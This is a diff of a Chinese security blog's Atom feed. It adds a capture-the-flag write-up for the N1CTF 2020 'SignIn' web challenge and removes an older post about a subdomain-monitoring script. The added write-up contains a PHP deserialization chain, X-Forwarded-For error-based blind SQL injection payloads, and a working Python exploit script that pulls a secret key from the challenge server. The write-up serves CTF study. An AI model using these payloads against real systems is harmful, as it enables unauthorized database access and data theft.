@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.svenbeast.com</id>
     <title>攻城肾透shi | sv3nbeast</title>
-    <updated>2020-09-23T14:52:52.685Z</updated>
+    <updated>2020-10-19T10:22:06.558Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.svenbeast.com"/>
     <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
@@ -10,6 +10,147 @@
     <logo>https://www.svenbeast.com/images/avatar.png</logo>
     <icon>https://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2020, 攻城肾透shi | sv3nbeast</rights>
+    <entry>
+        <title type="html"><![CDATA[{N1CTF·2020·web·SignIn·writeup}]]></title>
+        <id>https://www.svenbeast.com/post/n1ctf2020websigninwriteup/</id>
+        <link href="https://www.svenbeast.com/post/n1ctf2020websigninwriteup/">
+        </link>
+        <updated>2020-10-19T06:44:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="开始">开始</h3>
+<p>访问地址直接给出了源码:  http://101.32.205.189</p>
+<pre><code>&lt;?php 
+class ip {
+    public $ip;
+    public function waf($info){
+    }
+    public function __construct() {
+        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
+            $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']);
+        }else{
+            $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;];
+        }
+    }
+    public function __toString(){
+        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
+        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
+        if(!mysqli_query($con,$sqlquery)){
+            return mysqli_error($con);
+        }else{
+            return &quot;your ip looks ok!&quot;;
+        }
+        mysqli_close($con);
+    }
+}
+
+class flag {
+    public $ip;
+    public $check;
+    public function __construct($ip) {
+        $this-&gt;ip = $ip;
+    }
+    public function getflag(){
+    	if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
+    		readfile('/flag');
+    	}
+        return $this-&gt;ip;
+    }
+    public function __wakeup(){
+        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
+            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
+        else
+            $this-&gt;ip = &quot;noip&quot;;
+    }
+    public function __destruct() {
+        echo $this-&gt;getflag();
+    }
+
+}
+if(isset($_GET['input'])){
+    $input = $_GET['input'];
+	unserialize($input);
+} 
+</code></pre>
+<p>粗略一看，源码里<code>unserialize($input)</code>的大字告诉我们是需要控制传入input参数的反序列化数据来进行一些条件的满足从而来获得flag</p>
+<pre><code>    public function getflag(){
+    	if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
+    		readfile('/flag');
+    	}
+        return $this-&gt;ip;
+    }
+</code></pre>
+<p>最终达成的目的很明显就是运行flag类里的<code>getflag()</code>方法，通过readfile来获得flag文件，而想要运行此方法就要满足条件<code>md5($this-&gt;check)===md5(&quot;key****************&quot;)</code>，并且key我们是不知道的，看起来也没有办法控制，可以控制的话还可以通过传入数组让两边md5函数来返回null来进行条件满足，所以我们<code>需要知道这个key的值</code></p>
+<pre><code>    public function __toString(){
+        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
+        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
+        if(!mysqli_query($con,$sqlquery)){
+            return mysqli_error($con);
+        }else{
+            return &quot;your ip looks ok!&quot;;
+        }
+        mysqli_close($con);
+    }
+</code></pre>
+<p>然后很自然的将目光投放到上面的ip类中，看到此类获取了访问者XFF并插入表中，很自然的就想到了<code>xff注入</code>，通过注入来获得key，来赋值<code>flag类中的check变量</code>，而此mysql语句放在<code>__toString()</code>中，想要运行此函数就要满足一个对象被当做字符串对待来触发,所以我们<code>需要寻找一个能够触发__toString()的点</code></p>
+<pre><code>    public function __wakeup(){
+        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
+            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
+        else
+            $this-&gt;ip = &quot;noip&quot;;
+    }
+</code></pre>
+<p>分析一下发现，我们传入反序列化数据会触发<code>__wakeup()</code>,此处的<code>stristr()函数是对传入参数1中查找是否存在参数2</code>,而参数1也就是<code>$this-&gt;ip</code>是我们实例化flag时传入的字符串，属于可控参数，而当我们传入的是ip类实例化后的对象时，则刚好触发此ip类的__toString()函数，所以我们此时可以<code>生成序列化数据进行尝试</code></p>
+<pre><code>$flags = new flag(new ip());
+$b = serialize($flags);
+echo $b;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1603092883974.png" alt="" loading="lazy"></figure>
+<pre><code>INSERT into admin(`username`,`password`) VALUES ('user' and updatexml(1,concat(0x02,(select database()),0x02),1) and '','123456')
+</code></pre>
+<p><img src="https://www.svenbeast.com/post-images/1603098143275.png" alt="" loading="lazy"><br>
+然后在本地mysql尝试构造了一个insert注入payload: <code>INSERT into admin(<code>username</code>,<code>password</code>) VALUES ('user' or if(1=1,sleep(3),1) or '','123456')</code>本地运行成功，访问目标时提示如图<br>
+<img src="https://www.svenbeast.com/post-images/1603098231154.png" alt="" loading="lazy"><br>
+存在注入检测，应该就是waf函数没显示的那些代码，所以无法直接进行注入，需要另想办法，而<code>__wakeup()</code>函数中有一个可以帮助盲注的点，触发__toString()时，我们可以通过报错函数来控制返回的字符串是否存在n1ctf，所以构造注入语句<code>1.1.1.1' or updatexml(1,concat(0x01,(select if((1=1),'n1ctf','no str')),0x01),1) or '</code><br>
+<img src="https://www.svenbeast.com/post-images/1603099096481.png" alt="" loading="lazy"><br>
+提示了welcome to n1ctf2020，那么只有在传入的值中包含n1ctf才会提示这个，所以很明显是传入的对象成功触发toString函数，证明思路是正确的，其中的报错函数导致sql语句报错，使return的返回值中包含了n1ctf，根据这个逻辑去写一个python脚本跑一下,我这里使用了一个很实用的burpsuite的插件辅助生成个模板<br>
+<img src="https://www.svenbeast.com/post-images/1603099255763.png" alt="" loading="lazy"></p>
+<h3 id="exp"><strong>exp</strong></h3>
+<pre><code>import requests
+
+session = requests.Session()
+
+x = 'qwertyuiopasdfghjklzxcvbnm1234567890'
+
+arr = []
+paramsGet = {&quot;input&quot;:&quot;O:4:\&quot;flag\&quot;:2:{s:2:\&quot;ip\&quot;;O:2:\&quot;ip\&quot;:1:{s:2:\&quot;ip\&quot;;s:9:\&quot;127.0.0.1\&quot;;}s:5:\&quot;check\&quot;;N;}&quot;}
+for start in range(1,30):
+    for result in x:
+        #获得表名为n1key
+        # get_tables = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(table_name) from  information_schema.tables where table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
+        #获得列名
+        # get_column = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(column_name) from information_schema.columns where table_name='n1key' and table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
+        #获得key值
+        get_key = &quot;' or updatexml(1,concat(0x02,(select if((substring((select `key` from n1key),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
+        
+        headers = {&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;X-Forwarded-for&quot;:&quot;1.1.1.1{}&quot;.format(get_key),&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,ar;q=0.8&quot;}
+        response = session.get(&quot;http://101.32.205.189/index.php&quot;, params=paramsGet, headers=headers)
+
+        if '&lt;code&gt;noip&lt;/code&gt;' not in str(response.content):
+            print('tables:'+result)
+            arr.append(result)
+for res in arr:
+    print(res,end=&quot;&quot;)
+</code></pre>
+<p><img src="https://www.svenbeast.com/post-images/1603101199981.png" alt="" loading="lazy"><br>
+获得了表名为n1ip, n1key，这里是因为源码里有数据库名为n1ctf_websign，所以可直接跑出表名<br>
+<img src="https://www.svenbeast.com/post-images/1603101738162.png" alt="" loading="lazy"><br>
+获得列名为id,key<br>
+<img src="https://www.svenbeast.com/post-images/1603102665903.png" alt="" loading="lazy"><br>
+获得key为n1ctf20205bf75ab0a30dfc0c<br>
+<img src="https://www.svenbeast.com/post-images/1603102892602.png" alt="" loading="lazy"><br>
+<img src="https://www.svenbeast.com/post-images/1603102783683.png" alt="" loading="lazy"><br>
+然后用这个keu生成序列化数据进行访问，得到flag</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2020-1472 NetLogon 特权提升漏洞 ]]></title>
         <id>https://www.svenbeast.com/post/fu-xian-cve-2020-1472-netlogon-te-quan-ti-sheng-lou-dong/</id>
@@ -1313,141 +1454,6 @@ def process():
 <ul>
 <li>https://twitter.com/jas502n/status/1230531680999395328</li>
 <li>https://forum.90sec.com/t/topic/801</li>
-</ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[为OneForAll增加一个新增域名监控插件（One_Monitor）]]></title>
-        <id>https://www.svenbeast.com/post/-y8PKMNR2/</id>
-        <link href="https://www.svenbeast.com/post/-y8PKMNR2/">
-        </link>
-        <updated>2020-02-17T09:04:39.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
-<p>需要一个域名监控工具，本着工具越简单越好的理念，写了一个只能满足我需要的插件，好吧，其实是组装轮子的时候需要这个功能，然后有这功能的工具又都太乱了，我觉得有点冗余 -.-!</p>
-<h3 id="0x02-代码">0x02 代码</h3>
-<ul>
-<li>OneForAll(精灵师傅的子域名工具): https://github.com/shmilylty/OneForAll</li>
-<li>One_Monitor(新增域名监控插件):   https://github.com/sv3nbeast/One_Monitor</li>
-</ul>
-<pre><code># -*- coding:utf-8 -*-
-import re
-import sys
-import os
-import time
-import datetime
-
-path=&quot;C:/Users/Administrator/Desktop/tools/OneForAll/oneforall&quot;             #OneForAll绝对路径，需手动配置
-old=path+&quot;/域名监控/old_domain/&quot;                                            #存放上次扫描结果的文件夹，需手动创建并填写此配置
-new=path+&quot;/域名监控/new_domain/&quot;                                            #存放最新扫描结果的文件夹，需手动创建并填写此配置
-update=path+&quot;/域名监控/update/&quot;                                             #存放新增域名结果的文件夹,需手动创建并填写此配置
-old_import=path+&quot;/域名监控/old_import/&quot;                                     #存放目标域名数据库导出的上次结果,需手动创建并填写此配置
-
-result_name=path+&quot;/results/&quot;                                              #存放oneforall结果的文件夹路径,默认配置即可
-
-
-# print f_list
-
-def result_txt(result_name):   #生成监控域名扫描结果的txt文件名字
-    f_list = os.listdir(result_name)
-    with open(&quot;result_name.txt&quot;,&quot;w&quot;) as r:
-        for i in f_list:
-            # os.path.splitext():分离文件名与扩展名
-            if os.path.splitext(i)[1] == '.txt':
-                r.write(i+&quot;\n&quot;)
-    return True
-
-def update_domain():         #简化新旧扫描结果并进行对比，发现新增域名
-    f=open('result_name.txt','r')
-    lines=f.readlines()
-    f.close()
-    for line in lines:
-        line1=line.strip('\n')
-        target=line1[0:(line1.rfind('_', 1))]          #获得本次扫描目标域名
-        table_name=target.replace('.',&quot;_&quot;)+&quot;_now&quot;        #获得目标域名数据库存储表名
-        
-        print(&quot;[+] 开始导出&lt;&quot;+target+&quot;&gt;数据库记录，用做后面的对比&quot;)
-        print(os.system(&quot;python dbexport.py --table %s --format txt --dpath %s&quot; %(table_name,old_import)))
-        old_path=old+line1          #存放上次域名结果文件
-        new_path=new+line1          #存放本次域名结果文件
-        old_result_subdomain=old_import+table_name+&quot;_subdomain.txt&quot;    #存放域名扫描结果文件
-        new_result_subdomain=result_name+line1
-        
-        now_time = datetime.datetime.now().strftime('%Y-%m-%d') #获得当前日期，为新增域名做准备
-        update_subdomain=update+&quot;update_&quot;+now_time+&quot;_&quot;+line1   #为新增域名文件起个名字，防止重复
-
-
-        f=open(old_result_subdomain, encoding=&quot;utf-8&quot;)
-        f.close
-        lines=f.read()
-        pattern = re.compile(r'\|(http.*?://.*?)[ |]')
-        result = pattern.findall(lines)
-
-        print(&quot;[+] 获得&lt;&quot;+target+&quot;&gt;上次扫描子域名结果中 &quot;)
-        with open(old_path,'w') as fopen:
-            for subdomain_old in result:
-                fopen.write(subdomain_old+&quot;\n&quot;)
-
-        print(&quot;[+] 开始扫描子域名,时间较长，请耐心等待...&quot;)
-        os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target)
-        #print(&quot;[+]当前监控域名:&quot;+target+&quot;[+]&quot;+os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target))
-        f=open(new_result_subdomain, encoding=&quot;utf-8&quot;)
-        f.close
-        lines=f.read()
-        pattern = re.compile(r'\|(http.*?://.*?)[ |]')
-        result = pattern.findall(lines)
-        print(&quot;[+] 扫描完成，获得&lt;&quot;+target+&quot;&gt;最新扫描子域名结果中 &quot;)
-        with open(new_path,'w') as fopen:
-            for subdomain_new in result:
-                fopen.write(subdomain_new+&quot;\n&quot;)
-                
-
-        print(&quot;[*] 开始检测&lt;&quot;+target+&quot;&gt;域名是否新增...&quot;)
-
-        str1 = []
-        file_1 = open(old_path,&quot;r&quot;,encoding=&quot;utf-8&quot;)
-        print(&quot;[+] 已打开old_domain存储的上次扫描结果：&quot;+line1+&quot;文件，开始获取域名并存入数组old&quot;)
-        for line in file_1.readlines():
-            str1.append(line.replace(&quot;\n&quot;,&quot;&quot;))
-
-        str2 = []
-        file_2 = open(new_path, &quot;r&quot;, encoding=&quot;utf-8&quot;)
-        print(&quot;[+] 已打开new_domain存储的本次扫描结果：&quot;+line1+&quot;文件，开始获取域名并存入数组new&quot;)
-        for line in file_2.readlines():
-            str2.append(line.replace(&quot;\n&quot;, &quot;&quot;))
-
-
-        str_dump = []
-        print(&quot;[+] 正在对比数组获得新增域名中&quot;)
-        for line in str2:
-            if line not in str1:
-                str_dump.append(line)    #将两个文件重复的内容取出来
-        if len(str_dump) &lt; 1:
-            print(&quot;[+] 检测完成，不存在新增域名，请等待下一周期检测！&quot;)
-        else:
-            print(&quot;[+] 检测完成，存在新增域名:&quot;+&quot;\n&quot;)
-            for str in str_dump:             #去重后的结果写入文件
-                print(&quot; &quot;+str)
-                with open(update_subdomain,&quot;a+&quot;,encoding=&quot;utf-8&quot;) as f:
-                    f.write(str + &quot;\n&quot;)
-            num=len(str_dump)
-
-            number=num*900
-            min=num*30
-            print(&quot;\n&quot;+&quot;[+] &quot;+&quot;本次新增%s&quot;%num +&quot;个域名，将等待%s&quot;%min+&quot;分钟后执行下次任务&quot;)
-
-
-
-if __name__ == '__main__':
-    result_txt(result_name)
-    update_domain()
-</code></pre>
-<h3 id="0x03-运行前提">0x03 运行前提</h3>
-<ul>
-<li>1.配置好代码里的绝对路径，创建好文件夹，保证名称无误，One_Monitor.py放在和onforall.py同一路径下运行</li>
-<li>2.首先对想监控的域名用oneforall扫一遍，结果为txt格式</li>
-<li>3.我设置了一个域名30分钟的延迟，因为是实时漏扫，给留的时间，不需要可以删掉</li>
-<li>4.应该没啥了，代码灰常简单，有问题一看就知道的，有问题可以交流。还希望有人也能分享我一个代码简单但实用的脚本（附一个测试图，是计划任务启动的，所以是白板）<br>
-<img src="https://www.svenbeast.com/post-images/1581931856029.png" alt="" loading="lazy"></li>
 </ul>
 ]]></content>
     </entry>
